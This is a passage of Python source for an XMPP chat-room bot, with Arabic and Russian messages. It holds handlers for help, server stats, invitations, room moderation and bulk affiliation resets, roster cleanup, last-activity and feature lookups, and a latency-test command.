                                reply(type,source, "no ")

def CAPS33(prs, cljid):
  try:
    jid = prs['from'].split('/')
    groupchat = jid[0]
    nick = prs['from'][len(groupchat)+1:]
    try: caps3 = prs
    except: caps3 = ""	    
    if groupchat in GROUPCHATS and nick in GROUPCHATS[groupchat]:
                GROUPCHATS[groupchat][nick]['caps3']=caps3              
  except: pass	                
register_presence_handler(CAPS33)
register(CAPS3, "pres10", 10)
######################################################
######################################################

def help2(type, source, parameters):
 if type == 'groupchat':	
     access_level=str(user_level(source[1]+'/'+source[2], source[1]))
     reply(type,source, source[2]+' : '+'\n'+XCommands[1])	

 else:
     access_level=str(user_level(source[1]+'/'+source[2], source[1]))
 reply('chat', source,XCommands[2]+access_level+XCommands[3])
def help5(type, source, parameters):
        if type == 'groupchat':	
                reply(type,source, source[2]+' : '+'\n'+XCommands[1])	
        reply('chat', source, XFilterHelp[1])	
                
                
                
def helpm(type, source, parameters):
    reply(type, source, source[2]+' : '+XCommands[4])
                

register(help5, XFilterHelp[0], 0)	
register(helpm, XHelp[0], 0)			
register(help2, XCommands[0], 0)

######################################################
######################################################
def helpdarsh(t, s, p):

        if p:
                p=p.split()
                if p[0].lower() == Xacl[0]:
                 if t in ['groupchat']:				
                  reply(t,s,s[2]+' : '+"الرجاء فحص رسائل الخاص لديك") 
                 reply('chat',s,XHelpAcl[0])    
                elif p[0]==xshar7[0]:
                  if t in ['groupchat']:				
                    reply(t,s,s[2]+' : '+"الرجاء فحص رسائل الخاص لديك") 
                  reply('chat',s,s[2]+' : '+xshar7[1])  
                  time.sleep(1)
                  reply('chat',s,s[2]+' : '+xshar7[2]) 
                  time.sleep(1)
                  reply('chat',s,s[2]+' : '+xshar7[3]) 
                  time.sleep(1)
                  reply('chat',s,s[2]+' : '+xshar7[4]) 
                  time.sleep(1)
                  reply('chat',s,s[2]+' : '+xshar7[5]) 
                  time.sleep(1)
                  reply('chat',s,s[2]+' : '+xshar7[6]) 
                  time.sleep(1)
                  reply('chat',s,s[2]+' : '+xshar7[7]) 
                  time.sleep(1)
                  reply('chat',s,s[2]+' : '+xshar7[8]) 
                  time.sleep(1)
                  reply('chat',s,s[2]+' : '+xshar7[9]) 
                  time.sleep(1)
                  reply('chat',s,s[2]+' : '+xshar7[10]) 
                  time.sleep(1)
                  reply('chat',s,s[2]+' : '+xshar7[11]) 
                  return

 
				
        else:

                reply(t,s,s[2]+' : '+'\n'+XCommands[6])



register(helpdarsh, Xdarsh[0], 0)
######################################################
######################################################
# -*- coding: utf-8 -*-
#حالة السيرفر
WHO_JOIN = {}

def stats_handler(t, s, p):
    if not p:
        p=s[3].split('@')[1]
    packet = IQ(CLIENTS[s[3]], 'get')
    query = packet.addElement('query', 'http://jabber.org/protocol/stats')
    query.addElement('stat').__setitem__('name', 'users/total')
    query.addElement('stat').__setitem__('name', 'users/online')
    
    packet.addCallback(stats_result_handler, t, s, p)
    reactor.callFromThread(packet.send, p)

gog=None

def stats_result_handler(t, s, p, x):
    
    global gog
    gog=x
    if x['type'] == 'result':
        query = element2dict(x)['query']
        r = {}
        if not query.children:
            reply(t, s, s[2]+' : '+Xstats[1])
            return
        for i in query.children:
            r[i['name']] = i['value'] 
            units = i['units']							
        reply(t, s, s[2]+' : '+units+" / "+p+Xstats[2]+r.get('users/total', '?')+Xstats[3]+r.get('users/online', '?'))
    elif x['type'] == 'error':
        reply(t, s, s[2]+' : '+Xstats[1])


register(stats_handler, Xstats[0], 11)
######################################################
######################################################
# -*- coding: utf-8 -*-
#دعوة
def hnd_ivite(type, source, parameters):
    if not source[1] in GROUPCHATS:
        reply(type, source, source[2]+' : '+Xinvite[1])
        return
    if not parameters:
        return
    c = str()
    jid = None
    if parameters in GROUPCHATS[source[1]]:
        jid=get_true_jid(source[1]+'/'+parameters)
    else:
        if not parameters.count('@'):
            try:
                for x in MUC_USER[source[1]]:
                    c = x.lower()
                    if c == parameters.lower():
                        jid = MUC_USER[source[1]][x]['jid']
                        break
                if not jid:
                    reply(type, source, source[2]+' : '+Xinvite[2])
                    return
            except:
                reply(type, source, source[2]+' : '+Xinvite[2])
                return
        else:
            jid=parameters
    message = domish.Element(('jabber:client','message'))
    message['to'] = source[1]
    x=message.addElement('x', 'http://jabber.org/protocol/muc#user')
    inv = x.addElement('invite')
    inv['to'] = jid
    inv.addElement('reason').addContent(Xinvite[3]+source[2])
    #print unicode(message.toXml())
    reactor.callFromThread(dd, message, CLIENTS[source[3]])
    reply(type, source, source[2]+' : '+Xinvite[4])

register(hnd_ivite, Xinvite[0], 11)

######################################################
######################################################
#تصفير
def afl_set_(cljid, groupchat, jid):
        iq = domish.Element(('jabber:client', 'iq'))
        iq['type'] = 'set'
        iq['id'] = str(random.randrange(1,999))
        iq['to'] = groupchat
        query = iq.addElement('query', 'http://jabber.org/protocol/muc#admin')
        #for x in jid:
        i = query.addElement('item')
        i['affiliation'] = 'none'
        i['jid'] = jid          		
        reactor.callFromThread(dd, iq, CLIENTS[cljid])
        return	
def muc_answ(c, g, x):
        if x['type']=='result':
                
                query = element2dict(x)['query']
                query = [i.attributes for i in query.children if i.__class__==domish.Element]    
                UNBAN=query
                for x in UNBAN:
                 uu=x['jid']				 
                 afl_set_(c, g, uu)	
				 
def nato55(c, g):
        
                packet = IQ(CLIENTS[c], 'get')
                packet['id'] = 'item'+str(random.randrange(1000, 9999))
                query = packet.addElement('query', 'http://jabber.org/protocol/muc#admin')
                i = query.addElement('item')
                i['affiliation'] = 'outcast'
                packet.addCallback(muc_answ, c, g)
                reactor.callFromThread(packet.send, g)
                msg(c, g, Xlist2[6])				
def nato66(c, g):
        
                packet = IQ(CLIENTS[c], 'get')
                packet['id'] = 'item'+str(random.randrange(1000, 9999))
                query = packet.addElement('query', 'http://jabber.org/protocol/muc#admin')
                i = query.addElement('item')
                i['affiliation'] = 'member'
                packet.addCallback(muc_answ, c, g)
                reactor.callFromThread(packet.send, g)  
                msg(c, g, Xlist2[6])	                				
def hnd_656(t, s, p):
        if not s[1] in GROUPCHATS:
                return
        if not p:
                reply(t, s, s[2]+' : '+Xlist2[3])
                return
        if Xlist2[1] in p:		
                        reply(t, s, s[2]+' : '+Xlist2[4])		
                        nato55(s[3], s[1])
                        return						

        elif Xlist2[2] in p:		
                        reply(t, s, s[2]+' : '+Xlist2[5])		
                        nato66(s[3], s[1])
                        return	
        else:		
                        reply(t, s, s[2]+' : '+Xlist2[3])
                        return	
						
register(hnd_656, Xlist2[0], 30)

def hnd_6561(t, s, p):
        if not s[1] in GROUPCHATS:
                return
        if not p:
                reply(t, s, s[2]+' : '+Xlist2[3])
                return
        if Xlist2[1] in p:		
                        reply(t, s, s[2]+' : '+Xlist2[8])
                        for x in GROUPCHATS:
                         nato55(s[3], x)						
                        return						

        elif Xlist2[2] in p:		
                        reply(t, s, s[2]+' : '+Xlist2[9])		
                        for x in GROUPCHATS:
                         nato66(s[3], x)						
                        return	
        else:		
                        reply(t, s, s[2]+' : '+Xlist2[3])
                        return	
						
register(hnd_6561, Xlist2[7], 100)

######################################################
######################################################

def roster_add_admin(jid,cljid):
    p = domish.Element(('jabber:client', 'presence'))
    p['to'] = jid
    p['type'] = ''
    reactor.callFromThread(dd, p, CLIENTS[cljid])
def nato87(cljid):
 for x in GLOBACCESS:
  roster_add_admin(x,cljid)   
register_stage0_init(nato87)
Roster_del = {}	
def afl_set_1(jid,cljid):

    if jid in GLOBACCESS:
        return
		
    q = domish.Element(('jabber:client', 'iq'))
    q['type'] = 'set'
    q['id'] = str(random.randrange(1,999))
    query = q.addElement('query', 'jabber:iq:roster')
    i = query.addElement('item')
    i['jid'] = unicode(jid)
    i['subscription'] = 'remove'
    reactor.callFromThread(dd, q, CLIENTS[cljid])
    if not jid in Roster_del:    	
      Print('remove: '+unicode(jid), color_bright_blue)  	  
      Roster_del[jid]={}	  

    	
def roster_new(cljid,x):

    if x['type']=='result':
        query = element2dict(x)['query']
        query = [i.attributes for i in query.children if i.__class__==domish.Element]
        if not cljid in ROSTER:
            ROSTER[cljid] = {}		
        for c in query:		  	
         yy=c['jid']
         afl_set_1(yy,cljid)		 
         			 	                   				 
def nato5566(cljid):
    packet = IQ(CLIENTS[cljid], 'get')
    packet.addElement('query', 'jabber:iq:roster')
    packet.addCallback(roster_new, cljid)
    reactor.callFromThread(packet.send, cljid)        
register_stage0_init(nato5566)	
# -*- coding: utf-8 -*-

def idle_handler(typ, ss, pp):
    if not pp:
        pp=ss[3].split('@')[1]
    jids = pp
    packet = IQ(CLIENTS[ss[3]], 'get')
    packet.addElement('query', 'jabber:iq:last')
    packet.addCallback(idle_result_handler, typ, ss, pp)
    reactor.callFromThread(packet.send, jids)

def idle_result_handler(typ, ss, pp, x):
    if x['type']=='result':
        t=x.children[0].getAttribute('seconds')
        if not t:
            reply(t, ss, XDomainTime[1])
            return
        reply(typ, ss, pp+XDomainTime[2]+timeElapsed(int(t)))
    else:
        reply(typ, ss, XDomainTime[3])


def last_handler(t, s, p):
    if not p:
        reply(t, s, s[2]+' : '+XUserTime[1])
        return
    to = p
    i = 0
    if s[1] in GROUPCHATS.keys() and p in GROUPCHATS[s[1]]:
        to = s[1]+'/'+p
        i = 1
    iq = IQ(CLIENTS[s[3]], 'get')
    iq['to'] = to
    iq.addElement('query', 'jabber:iq:last')
    iq.addCallback(last_result_handler, t, s, p, i)
    reactor.callFromThread(iq.send, to)

def last_result_handler(t, s, p, i, x):
    tim=0
    rep=''
    if x['type']=='result':
        try: tim=x.children[0]['seconds']
        except:
            for c in x.elements():
                tim=c.getAttribute('seconds')
                if tim:
                    break
        rep+=u' '+p+u' <iq:last> - '+timeElapsed(int(tim))+XUserTime[3]
    else:
        rep+=XUserTime[2]
    if i:
        try: rep+=XUserTime[4]+timeElapsed(time.time()-GROUPCHATS[s[1]][p]['idle'])+XUserTime[3]
        except: pass
    reply(t, s, s[2]+' : '+rep)

LAST_IQ_ALL = {}


def lastall_result_handler(t, s, m, x):
    global LAST_IQ_ALL
    if not s[1] in LAST_IQ_ALL:
        LAST_IQ_ALL[s[1]]={'live':[],'died':[],'none':[]}
    if x['type']=='result':
        try: tim=x.children[0]['seconds']
        except:
            for c in x.elements():
                tim=c.getAttribute('seconds')
                if tim:
                    break
        if int(tim)<200:
            if not m in LAST_IQ_ALL[s[1]]['live']:
                LAST_IQ_ALL[s[1]]['live'].append(m)
        else:
            if not m in LAST_IQ_ALL[s[1]]['died']:
                LAST_IQ_ALL[s[1]]['died'].append(m)
    else:
        LAST_IQ_ALL[s[1]]['none'].append(m)



register(idle_handler, XDomainTime[0], 11)
register(last_handler, XUserTime[0], 11)

######################################################
######################################################
# -*- coding: utf-8 -*-

def handler_spisok_iq(type, source, parameters):
        if not source[1] in GROUPCHATS: return
        if not parameters:
                reply(type,source,Xlist[2])
                return
        body=parameters.lower()
        nick = source[2]
        groupchat=source[1]
        afl=''
        if body.count(Xlist[3])>0:
                afl='owner'
        elif body.count(Xlist[4])>0:
                afl='admin'
        elif body.count(Xlist[5])>0:
                afl='member'
        elif body.count(Xlist[6])>0:
                afl='outcast'
        if afl=='':
                return
        packet = IQ(CLIENTS[source[3]], 'get')
        packet['id'] = 'item'+str(random.randrange(1000, 9999))
        query = packet.addElement('query', 'http://jabber.org/protocol/muc#admin')
        i = query.addElement('item')
        i['affiliation'] = afl
        packet.addCallback(handler_sp_answ, type, source)
        reactor.callFromThread(packet.send, groupchat)


def handler_sp_answ(type, source, x):
        rep, n = '', 0
        if x['type']=='result':
                query = element2dict(x)['query']
                query = [i.attributes for i in query.children if i.__class__==domish.Element]
                if not query:
                        reply(type, source, source[2]+' : '+Xlist[8])
                        return
                for c in query:
                        n+=1
                        rep+=str(n)+') '+c['jid']+'\n'
        else:
                reply(type,source,Xlist[8])
                return
        if type in ['groupchat']:
                reply('groupchat', source, Xlist[9]+str(n)+')')
        reply('private', source, Xlist[7]+str(n)+':\n'+rep)
	
register(handler_spisok_iq, Xlist[0], 20)
register(handler_spisok_iq, Xlist[1], 20)

######################################################
######################################################
# -*- coding: utf-8 -*-
#مجموعة اوانر الادمن
from twisted.internet.reactor import callFromThread
import datetime

TRAF_FROM_MUC = {}

bot_start = str(datetime.datetime.today())[:-7]

def moderate_set(t, s, p, jn, jid_nick, ra, set_to, reason):
    d = moderate(s, jn, jid_nick, ra, set_to, reason)
    d.addCallback(moderate_result_handler, t, s, p)
def moderate_set1(t, s, p, jn, jid_nick, ra, set_to, reason):
    d = moderate(s, jn, jid_nick, ra, set_to, reason)
def moderate_result_handler(x, t, s, p):
    if x['type'] == 'result': reply(t, s, s[2]+' : '+Xadmin[10])
    else: reply(t, s, s[2]+' : '+Xadmin[11])

def moderate(s, jn, jid_nick, ra, set_to, reason=None):
    if not reason:
        try: reason = get_bot_nick(s[1])
        except: reason = ''
    packet = IQ(CLIENTS[s[3]], 'set')
    query = packet.addElement('query', 'http://jabber.org/protocol/muc#admin')
    i = query.addElement('item')
    i[jn] = jid_nick
    i[ra] = set_to
    i.addElement('reason').addContent(reason)
    d = Deferred()
    packet.addCallback(d.callback)
    reactor.callFromThread(packet.send, s[1])
    return d

def ban(cljid, groupchat, jid):
    room_access(cljid, groupchat, 'affiliation', 'outcast', 'jid', jid)

def unban(cljid, groupchat, jid):
    room_access(cljid, groupchat, 'affiliation', 'none', 'jid', jid)

def room_access3(cljid, groupchat, aff_role, par_one, jid_nick, par_two):
    q = domish.Element(('jabber:client', 'iq'))
    q['type'] = 'set'
    q['id'] = str(random.randrange(1,999))
    q['to'] = groupchat
    query = q.addElement('query', 'http://jabber.org/protocol/muc#admin')
    i = query.addElement('item')
    i[aff_role] = par_one
    i[jid_nick] = par_two
    reactor.callFromThread(dd, q, CLIENTS[cljid])

def hnd_unban(t, s, p):
    if not s[1] in GROUPCHATS or not p: return
    jid = p
    if p in GROUPCHATS[s[1]]:
        jid = GROUPCHATS[s[1]][p]['jid']
    moderate_set(t, s, jid, 'affiliation', 'none', 'jid', jid, s[2])
    #reply(type, source, u'تم ;-)')
def hnd_ban(type, source, parameters):
        groupchat = source[1]
        sp=parameters.split()
        if not parameters:
                reply(type, source, source[2]+' : '+Xadmin[9])
                return
        else:
                if not parameters.count('@'):
                        nick = sp[0]
                        if GROUPCHATS.has_key(source[1]):
                                if not nick in GROUPCHATS[groupchat]:
                                        reply(type, source, source[2]+' : '+Xadmin[9])
                                        return
                                else:
                                        if parameters.count(' ') and parameters.count(' '):
                                         jid = GROUPCHATS[source[1]][sp[0]]['jid']
                                         moderate_set(type, source, parameters, 'affiliation', 'outcast', 'jid', jid, sp[1])
                                         return										
                                        else:										
                                         jid = GROUPCHATS[source[1]][parameters]['jid']
                                         moderate_set(type, source, parameters, 'affiliation', 'outcast', 'jid', jid, Xadmin[15]+Xadmin[16]+source[2])
                                         return
                else:
                        jid = parameters
                        moderate_set(type, source, parameters, 'affiliation', 'outcast', 'jid', jid, Xadmin[16]+source[2])
                        return

def hnd_member(type, source, parameters):
    if not source[1] in GROUPCHATS:
        return
    if parameters:
        jid = parameters
        if parameters in GROUPCHATS[source[1]]:
            jid = get_true_jid(source[1]+'/'+parameters)
        moderate_set(type, source, parameters, 'affiliation', 'member', 'jid', jid, source[2])
        #reply(type, source, u'تم ;-)')
    else:
        reply(type, source, source[2]+' : '+Xadmin[9])   
def hnd_participant(type, source, parameters):	
        if not source[1] in GROUPCHATS:
                return
        if not parameters:
                reply(type, source, source[2]+' : '+Xadmin[9]) 		
        if parameters:
                if parameters.count('@') and parameters.count('.'):
                        moderate_set(type, source, parameters, 'role', 'participant', 'jid', parameters, source[2])	
                else:
                        moderate_set(type, source, parameters, 'role', 'participant', 'nick', parameters, source[2])		

def hnd_kick(type, source, parameters):
 sp=parameters.split() 
 if not source[1] in GROUPCHATS:
                return
 if not parameters:
                reply(type, source, source[2]+' : '+Xadmin[9]) 		
 if parameters:
                if parameters.count('@') and parameters.count('.'):
                        moderate_set(type, source, parameters, 'role', 'none', 'jid', parameters, Xadmin[15]+Xadmin[17]+source[2])
                else:
                 if parameters.count(' ') and parameters.count(' '):		
                  moderate_set(type, source, sp[0], 'role', 'none', 'nick', sp[0], sp[1]) 
                  return				  
                 else:				  
                  moderate_set(type, source, parameters, 'role', 'none', 'nick', parameters, Xadmin[15]+Xadmin[17]+source[2]) 
 
def hnd_visitor(type, source, parameters):
        if not source[1] in GROUPCHATS:
                return
        if not parameters:
                reply(type, source, source[2]+' : '+Xadmin[9]) 		
        if parameters:
                if parameters.count('@') and parameters.count('.'):
                        moderate_set(type, source, parameters, 'role', 'visitor', 'jid', parameters, source[2])
                else:
                        moderate_set(type, source, parameters, 'role', 'visitor', 'nick', parameters, source[2])
                        moderate_set1(type, source, parameters, 'affiliation', 'none', 'nick', parameters, source[2])
                        reply(type, source, source[2]+' : '+Xadmin[19]) 					
def hnd_owner(type, source, parameters):
        if not source[1] in GROUPCHATS:
                return
        if not parameters:
                reply(type, source, source[2]+' : '+Xadmin[9]) 		
        if parameters:
                if parameters.count('@') and parameters.count('.'):
                        moderate_set(type, source, parameters, 'affiliation', 'owner', 'jid', parameters, source[2])
                else:
                        moderate_set(type, source, parameters, 'affiliation', 'owner', 'nick', parameters, source[2])
def hnd_admin(type, source, parameters):
        if not source[1] in GROUPCHATS:
                return
        if not parameters:
                reply(type, source, source[2]+' : '+Xadmin[9]) 			
        if parameters:
                if parameters.count('@') and parameters.count('.'):
                        moderate_set(type, source, parameters, 'affiliation', 'admin', 'jid', parameters, source[2])
                else:
                        moderate_set(type, source, parameters, 'affiliation', 'admin', 'nick', parameters, source[2])			
		
			
register(hnd_owner, Xadmin[6], 30)	
register(hnd_admin, Xadmin[7], 30)			
register(hnd_unban, Xadmin[8], 20)
register(hnd_ban, Xadmin[0], 20)
register(hnd_ban, Xadmin[5], 20)
register(hnd_participant, Xadmin[18], 20)
register(hnd_kick, Xadmin[1], 20)
register(hnd_kick, Xadmin[4], 20)
register(hnd_visitor, Xadmin[2], 20)
#register(hnd_member, 'عضوˆ', 20)
register(hnd_member, Xadmin[3], 20)

######################################################
######################################################
# -*- coding: utf-8 -*-
	
def nkt(type, source, parameters):
        replies = Xslam[72]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
			


register(nkt, Xslam[69], 0)
register(nkt, Xslam[70], 0)
register(nkt, Xslam[71], 0)
######################################################
######################################################
# -*- coding: utf-8 -*-

#e = threading.Event()
#e.wait()
#USER_PING_FILE = 'rooms-data/user_ping.py'

#initialize_file(USER_PING_FILE, '{}')


TURBO_PING = {}

features = {'http://jabber.org/protocol/activity':'XEP-0108: User Activity',
            'http://jabber.org/protocol/address':'XEP-0033: Extended Stanza Addressing',
            'http://jabber.org/protocol/amp':'XEP-0079: Advanced Message Processing',
            'http://jabber.org/protocol/bytestreams':'XEP-0065: SOCKS5 Bytestreams',
            'http://jabber.org/protocol/caps':'XEP-0115: Entity Capabilities',
            'http://jabber.org/protocol/chatstates':'XEP-0085: Chat State Notifications',
            'http://jabber.org/protocol/commands':'XEP-0050: Ad-Hoc Commands',
            'http://jabber.org/protocol/compress':'XEP-0138: Stream Compression',
            'http://jabber.org/protocol/disco':'XEP-0030: Service Discovery',
            'http://jabber.org/protocol/feature-neg':'XEP-0020: Feature Negotiation',
            'http://jabber.org/protocol/geoloc':'XEP-0080: User Geolocation',
            'http://jabber.org/protocol/http-auth':'XEP-0072: SOAP Over XMPP',
            'http://jabber.org/protocol/httpbind':'XEP-0124: Bidirectional-streams Over Synchronous HTTP',
            'http://jabber.org/protocol/ibb':'XEP-0047: In-Band Bytestreams',
            'http://jabber.org/protocol/mood':'XEP-0107: User Mood',
            'http://jabber.org/protocol/muc':'XEP-0045: Multi-User Chat',
            'http://jabber.org/protocol/offline':'XEP-0013: Flexible Offline Message Retrieval',
            'http://jabber.org/protocol/physloc':'XEP-0080: User Geolocation',
            'http://jabber.org/protocol/pubsub':'XEP-0060: Publish-Subscribe',
            'http://jabber.org/protocol/rosterx':'XEP-0144: Roster Item Exchange',
            'http://jabber.org/protocol/sipub':'XEP-0137: Publishing SI Requests',
            'http://jabber.org/protocol/soap':'XEP-0072: SOAP Over XMPP',
            'http://jabber.org/protocol/waitinglist':'XEP-0130: Waiting Lists',
            'http://jabber.org/protocol/xhtml-im':'XEP-0071: XHTML-IM',
            'http://jabber.org/protocol/xdata-layout':'XEP-0141: Data Forms Layout',
            'http://jabber.org/protocol/xdata-validate':'XEP-0122: Data Forms Validation',
            'ipv6':'Support of IPv6',
            'jabber:client':'RFC 3921: XMPP IM',
            'jabber:component:accept':'XEP-0114: Existing Component Protocol',
            'jabber:component:connect':'XEP-0114: Existing Component Protocol',
            'jabber:iq:auth':'XEP-0078: Non-SASL Authentication',
            'jabber:iq:browse':'XEP-0011: Jabber Browsing',
            'jabber:iq:gateway':'XEP-0100: Gateway Interaction',
						'jabber:iq:last':															'XEP-0012: Last Activity',
						'jabber:iq:oob':															'XEP-0066: Out of Band Data',
						'jabber:iq:pass':															'XEP-0003: Proxy Accept Socket Service',
						'jabber:iq:privacy':													'RFC 3921: XMPP IM',
						'jabber:iq:private':													'XEP-0049: Private XML Storage',
						'jabber:iq:register':													'XEP-0077: In-Band Registration',
						'jabber:iq:roster':														'RFC 3921: XMPP IM',
						'jabber:iq:rpc':															'XEP-0009: Jabber-RPC',
						'jabber:iq:search':														'XEP-0055: Jabber Search',
						'jabber:iq:time':															'XEP-0202: Entity Time',
						'jabber:iq:version':													'XEP-0092: Software Version',
						'jabber:server':															'RFC 3921: XMPP IM',
						'jabber:x:data':															'XEP-0004: Data Forms',
						'jabber:x:delay':															'XEP-0203: Delayed Delivery',
						'jabber:x:encrypted':													'XEP-0027: Current OpenPGP Usage',
						'jabber:x:event':															'XEP-0022: Message Events',
						'jabber:x:expire':														'XEP-0023: Message Expiration',
						'jabber:x:oob':																'XEP-0066: Out of Band Data',
						'jabber:x:roster':														'XEP-0093: Roster Item Exchange',
						'jabber:x:signed':														'XEP-0027: Current OpenPGP Usage',
						'urn:xmpp:delay':															'XEP-0203: Delayed Delivery',
						'urn:xmpp:ping':															'XEP-0199: XMPP Ping',
						'urn:xmpp:receipts':													'XEP-0199: XMPP Ping',
						'urn:xmpp:ssn':																'XEP-0155: Stanza Session Negotiation',
	    'urn:xmpp:time':'XEP-0202: Entity Time',
            'vcard-temp':'XEP-0054: vcard-temp'}

def hnd_disco_info(t, s, p):
    if not p:
        return
    if s[1] in GROUPCHATS and p in GROUPCHATS[s[1]].keys():
        p = s[1]+'/'+p
    packet = IQ(CLIENTS[s[3]], 'get')
    packet.addElement('query', 'http://jabber.org/protocol/disco#info')
    packet.addCallback(disco_info_answ, t, s, p)
    reactor.callFromThread(packet.send, p)


def disco_info_answ(t, s, p, x):
    cat = ''
    info = 1
    rep = ''
    client = 0

    
    if x['type'] == 'result':
        
        try:
            cat = x.children[0].children[0].attributes['category']
            if cat in ['client']:
                client = 1
        except:
            client = 1
        if client:
            try:
                list = [c.attributes for c in element2dict(x)['query'].children if hasattr(c, 'attributes')]
                if list[0].get('category','')=='client':
                    rep+=u'Фичи клиента '+str(len(list)-1)+':\n'
                    for c in list[1:]:
                        a = c.get('var','').__str__()
                        rep+=(a if not a in features else features[a])+'\n'
                    info = [c for c in x.children[0].elements() if c.uri == 'jabber:x:data']
                    info = ([] if not info else info[0])
                    if info and info.children:
                        
                        for m in info.children:
                            try:
                                i = element2dict(m)['value'].__str__()
                                if not i.isspace():
                                   
                                    
                                    rep+= m.attributes['var']+': '+i+'\n'
                            except: pass
                    reply(t, s, s[2]+' : '+rep)
            except:
                raise
                reply(t, s, s[2]+' : '+u'Глюк')
                return
        if cat in ['server','pubsub']:
            list = [c.attributes.get('var',None) for c in x.children[0].children if c.attributes.get('var',None)]
            reply(t, s, s[2]+' : '+u'Фичи сервера '+str(len(list))+':\n'+'\n'.join([(x if not x in features else features[x]) for x in list]))
        elif cat == 'conference':
            rep+=x.children[0].children[0].attributes.get('name','')+'\n'

            list = [c.attributes.get('var',None) for c in x.children[0].children if c.attributes.get('var',None)]
            rep+=', '.join(list); rep+='\n'
            info = [c for c in x.children[0].elements() if c.uri == 'jabber:x:data']
            info = ([] if not info else info[0])
            if info and info.children:
                for x in info.children:
                    try:
                        i = element2dict(x)['value'].__str__()
                        if not i.isspace():
                            rep+= x.attributes['label']+': '+i+'\n'
                    except: pass
            rep+=''
            reply(t, s, s[2]+' : '+rep)
        
    else:
        reply(t, s, s[2]+' : '+u'Не судьба')#390 41 22

#register_command_handler(hnd_disco_info, 'инфо', ['все'], 0, 'Информация о сервере,конференции или нике, улучшеный аналог команды фичи.', 'инфо <jid>', ['инфо mafiozo.in'])


def hnd_turbo_info(t, s, p):
    rep = str()
    if TURBO_PING:
        if not p:
            reply(t, s, s[2]+' : '+'\n'.join([str(TURBO_PING.keys().index(x)+1)+') '+x for x in TURBO_PING.keys()])+u'\nВыберите номер')
            return
        if p and p.isdigit() and len(TURBO_PING)>=int(p)-1:
            reply(t, s, s[2]+' : '+'\n'+', '.join([str(x) for x in TURBO_PING[TURBO_PING.keys()[int(p)-1]]['jid']]))
    else:
        reply(t, s, s[2]+' : '+u'Пусто')

TRB_BUF = {}

#sh = None

P_VAR = {'jid':[0,3,6,9,12,15,18],'bot':[1,4,7,10,13,16,19],'s2s':[2,5,8,11,14,17,20]}

def hnd_turboping(t, s, p):
    global TURBO_PING
    global TURBO_SERVER
    global TURBO_S2S
    global P_VAR


    usr = get_true_jid(s)

    if p and not p in GROUPCHATS.get(s[1],[]) and (p.count(' ') or not p.count('.')):
        p = ''

    if usr in TRB_BUF.keys():
        reply(t, s, s[2]+' : '+Xping[2])
        return

    TRB_BUF[usr] = time.time()

    def errping(x, t, s, jid, i):
        out = 'ممممم'

        ##print jid
        
        try:
            err = re.findall('\'(.*?)\'',x.getErrorMessage())
            if not err:
                err = x.getErrorMessage()
            else:
                err = err[0]
        except:
            err = str()
        if get_true_jid(s) in TRB_BUF:
            if err and err=='IQ timed out':
                if jid.split('/')[0]==s[3]:
                    reply(t, s, s[2]+' : '+Xping[3])
                    
                else:
                    reply(t, s, s[2]+' : '+Xping[4])
            else:
                reply(t, s, s[2]+' : '+Xping[5]+str(round(time.time()-i, 3))+Xping[6])
        try: del TRB_BUF[get_true_jid(s)]
        except: pass

    def turboping_handler(x, jid, i, type, s):
        if not hasattr(x, '__getitem__'):
            return
        if x['type'] == 'result':
            t = time.time()

            if int(x['id'])==0:
                reply(type, s, s[2]+' : '+Xping[7]+str(round(t-i, 3))+Xping[8])
				                 

            if int(x['id']) in P_VAR['bot']:#range(11, 16):
                TURBO_PING[jid]['bot'].append(round(t-i, 3))
            if int(x['id']) in P_VAR['s2s']:
                TURBO_PING[jid]['s2s'].append(round(t-i, 3))
            if int(x['id']) in P_VAR['jid']:
                TURBO_PING[jid]['jid'].append(round(t-i, 3))
        else:
            ERROR={'400':Xdisco[5],'401':Xdisco[5],'402':Xdisco[5],'403':Xdisco[5],'404':Xdisco[5],'405':Xdisco[5],'406':Xdisco[5],'407':Xdisco[5],'408':Xdisco[5],'409':Xdisco[5],'500':Xdisco[5],'501':Xdisco[5],'503':Xdisco[5],'504':Xdisco[5]}
            if x['type'] == 'error':
                try: del TRB_BUF[get_true_jid(s)]
                except: pass
                try: code = [c['code'] for c in x.children if (c.name=='error')]
                except: code = []
                if ' '.join(code) in ERROR: add=ERROR[' '.join(code)]
                reply(type, s, s[2]+' : '+Xping[9]+' '.join(code)+' '+add)
        
    
    if s[0].isdigit():
        reply(t, s, s[2]+' : '+Xping[10])
        return
    jid = s[1]+'/'+s[2]
    if p:
        jid = p
        if s[1] in GROUPCHATS and p in GROUPCHATS[s[1]]:
            jid = s[1]+'/'+p

    TURBO_PING[jid]={'jid':[],'bot':[],'s2s':[]}
    
    #reply(t, s, s[2]+' : '+u'Тестирование займет несколько минут')
    tojid = ''
    srv = ''
    smb = ''
    inmuc = False
    for x in range(20):

        if not usr in TRB_BUF.keys():
            return

        tojid = jid
        
        if x in P_VAR['s2s']:
            if jid.count('@'):
                smb = '@'
                if jid.count('@conference.'):
                    smb = '@conference.'
                    inmuc = True
                    tojid = s[1]+'/'+get_bot_nick(s[1])
                else:
                    tojid = jid.split(smb)[1]
                    if tojid.count('/'):
                        tojid = tojid.split('/')[0]
                srv = tojid
                
            else:
                break
        if x in P_VAR['bot']:#range(11, 16):
            tojid = s[3]+'/'+BoTRiS
        
        packet = xmlstream.IQ(CLIENTS[s[3]], 'get')
        packet.timeout = 120
        packet['id'] = str(x)
        packet['to'] = tojid
        ##print tojid,x
        packet.addElement('query', 'jabber:iq:version')
        #packet.addCallback(turboping_handler, jid, time.time())
        #reactor.callFromThread(packet.send, tojid)
        def sender(packet, jid, t, s, tojid):
            ts = time.time()
            d = packet.send()
            d.addErrback(errping, t, s, tojid, ts)
            d.addCallback(turboping_handler, jid, ts, t, s)
        reactor.callFromThread(sender, packet, jid, t, s, tojid)
        time.sleep(3)
    tt = time.time()
    while len(TURBO_PING[jid]['jid'])+len(TURBO_PING[jid]['bot'])+len(TURBO_PING[jid]['s2s'])<19:
        if time.time()-tt<160:
            time.sleep(1)
            pass
        break
    if len(TURBO_PING[jid]['jid'])<3:
        if usr in TRB_BUF.keys():
            del TRB_BUF[usr]
            reply(t, s, s[2]+' : '+Xping[11])
        return
    try:
        l = getMedian(TURBO_PING[jid]['jid'])
        bot = min(TURBO_PING[jid]['bot'])#getMedian(TURBO_PING[jid]['bot'])
    except:
        if usr in TRB_BUF.keys():
            del TRB_BUF[usr]
            reply(t, s, s[2]+' : '+u'..')
        return
    s2s = 0
    if len(TURBO_PING[jid]['s2s'])>2:
